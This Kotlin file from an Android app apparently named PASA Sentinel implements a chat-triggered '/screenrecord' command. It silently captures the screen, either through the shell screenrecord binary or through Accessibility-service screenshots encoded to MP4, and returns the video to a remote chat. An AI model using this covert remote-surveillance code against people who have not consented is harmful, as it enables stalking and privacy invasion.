package com.izhaanintellect.pasa.commands

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Log
import com.izhaanintellect.pasa.camera.ScreenVideoEncoder
import com.izhaanintellect.pasa.camera.ScreenshotManager
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.TimeoutException
import javax.inject.Inject
import javax.inject.Singleton

/**
 * `/screenrecord` — Record screen as silent MP4 video.
 *
 * Dual-Engine Recording Pipeline:
 * 1. Hardware Engine: Uses `/system/bin/screenrecord` if Device Owner is provisioned.
 * 2. Accessibility Engine: Captures rapid frames via AccessibilityService and encodes
 *    them into a standard H.264 MP4 video using native MediaCodec/MediaMuxer.
 *    (Works on ANY phone with Accessibility enabled — NO computer or ADB required!)
 */
@Singleton
class ScreenRecordCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val screenshotManager: ScreenshotManager
) : Command {

    override val name = "/screenrecord"
    override val description = "Record screen as MP4 video (Accessibility or Device Owner)"
    override val usage = "/screenrecord [seconds=15]"

    companion object {
        private const val TAG = "PASA_ScreenRecordCmd"
        private const val MIN_SECONDS = 5
        private const val MAX_SECONDS = 60
        private const val DEFAULT_SECONDS = 15
        private const val BITRATE_KBPS = 8000
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        val durationSeconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(MIN_SECONDS, MAX_SECONDS) ?: DEFAULT_SECONDS
        val outputFile = File(context.cacheDir, "screenrecord_${System.currentTimeMillis()}.mp4")

        Log.i(TAG, "Requesting screen recording for ${durationSeconds}s")

        // ── Engine 1: Device Owner Hardware Recording (60fps) ──────────────────
        if (isDeviceOwner()) {
            Log.i(TAG, "Device Owner active — attempting hardware screenrecord")
            val hwSuccess = tryHardwareScreenRecord(outputFile, durationSeconds)
            if (hwSuccess && outputFile.exists() && outputFile.length() > 0) {
                val sizeMB = String.format("%.1f", outputFile.length() / 1024.0 / 1024.0)
                return CommandResult(
                    success = true,
                    message = "🎬 Screen recorded via Hardware Engine (${durationSeconds}s, $sizeMB MB)",
                    videoFile = outputFile
                )
            }
            Log.w(TAG, "Hardware screenrecord failed or empty — falling back to Accessibility Engine")
        }

        // ── Engine 2: Accessibility Screen Recording (No ADB/PC required) ───────
        if (screenshotManager.isAccessibilityServiceEnabled()) {
            Log.i(TAG, "Using Accessibility Screen Recorder Engine")
            val a11yResult = recordViaAccessibility(outputFile, durationSeconds)
            if (a11yResult != null) {
                return a11yResult
            }
        }

        // ── Engine 3: Neither engine available — guide user ────────────────────
        return CommandResult(
            success = false,
            message = "❌ <b>Screen recording requires Accessibility Service or Device Owner</b>\n" +
                    "━━━━━━━━━━━━━━━━━━━━\n\n" +
                    "👉 <b>Recommended (No PC required):</b>\n" +
                    "1. Open Android <b>Settings > Accessibility</b>.\n" +
                    "2. Select <b>PASA Sentinel</b> and toggle <b>ON</b>.\n" +
                    "<i>(This enables silent screen recording & screenshots instantly)</i>\n\n" +
                    "👉 <b>Alternative (60 FPS Hardware Engine):</b>\n" +
                    "Provision Device Owner via ADB using <code>/device_owner</code>."
        )
    }

    private suspend fun recordViaAccessibility(outputFile: File, durationSeconds: Int): CommandResult? {
        val fps = 2 // 2 frames per second
        val totalFramesTarget = (durationSeconds * fps).coerceIn(4, 40)
        val intervalMs = (1000L / fps)

        val batchSize = 5
        val frames = mutableListOf<Bitmap>()
        var processedCount = 0
        val startTime = System.currentTimeMillis()
        val endTime = startTime + (durationSeconds * 1000L)

        Log.i(TAG, "Capturing up to $totalFramesTarget frames over ${durationSeconds}s via Accessibility")

        try {
            while (System.currentTimeMillis() < endTime && processedCount < totalFramesTarget) {
                val batch = mutableListOf<Bitmap>()
                // Collect up to batchSize frames
                repeat(batchSize.coerceAtMost(totalFramesTarget - processedCount)) {
                    if (System.currentTimeMillis() >= endTime) return@repeat
                    val shotFile = screenshotManager.captureScreenshot()
                    if (shotFile != null && shotFile.exists() && shotFile.length() > 0) {
                        val bmp = BitmapFactory.decodeFile(shotFile.absolutePath)
                        if (bmp != null) batch.add(bmp)
                    }
                    try { shotFile?.delete() } catch (_: Throwable) {}
                    delay(intervalMs)
                }
                frames.addAll(batch)
                processedCount += batch.size
            }
        } catch (e: Throwable) {
            Log.e(TAG, "Error capturing frames (possibly OOM)", e)
        }

        if (frames.isEmpty()) {
            Log.w(TAG, "Accessibility captured 0 frames")
            return null
        }

        Log.i(TAG, "Captured ${frames.size} frames. Encoding to MP4 via MediaCodec...")
        val encoded = ScreenVideoEncoder.encodeBitmapsToMp4(frames, outputFile, fps = fps)

        // Recycle bitmaps to free memory
        for (bmp in frames) {
            try { bmp.recycle() } catch (_: Exception) {}
        }

        if (encoded && outputFile.exists() && outputFile.length() > 0) {
            val sizeMB = String.format("%.2f", outputFile.length() / 1024.0 / 1024.0)
            Log.i(TAG, "Accessibility MP4 recording encoded successfully: $sizeMB MB (${frames.size} frames)")
            return CommandResult(
                success = true,
                message = "🎬 Screen recorded (${durationSeconds}s, ${frames.size} frames, $sizeMB MB)",
                videoFile = outputFile
            )
        } else {
            Log.e(TAG, "Failed to encode Accessibility frames to MP4")
            return null
        }
    }

    private suspend fun tryHardwareScreenRecord(outputFile: File, durationSeconds: Int): Boolean {
        return withTimeoutOrNull((durationSeconds + 10) * 1000L) {
            try {
                val command = arrayOf(
                    "sh",
                    "-c",
                    "screenrecord --size 720x1280 --bit-rate ${BITRATE_KBPS * 1000} " +
                            "--time-limit $durationSeconds ${outputFile.absolutePath}"
                )
                val process = Runtime.getRuntime().exec(command)
                val completed = process.waitFor(durationSeconds + 5L, TimeUnit.SECONDS)
                if (!completed) {
                    process.destroy()
                    return@withTimeoutOrNull false
                }
                process.exitValue() == 0 && outputFile.exists() && outputFile.length() > 0
            } catch (e: Exception) {
                Log.w(TAG, "Hardware screenrecord failed: ${e.message}")
                false
            }
        } ?: false
    }

    private fun isDeviceOwner(): Boolean {
        // Only attempt hardware screenrecord if process has shell or root UID
        return android.os.Process.myUid() == 2000 /* SHELL_UID */ || android.os.Process.myUid() == 0 /* ROOT */
    }
}
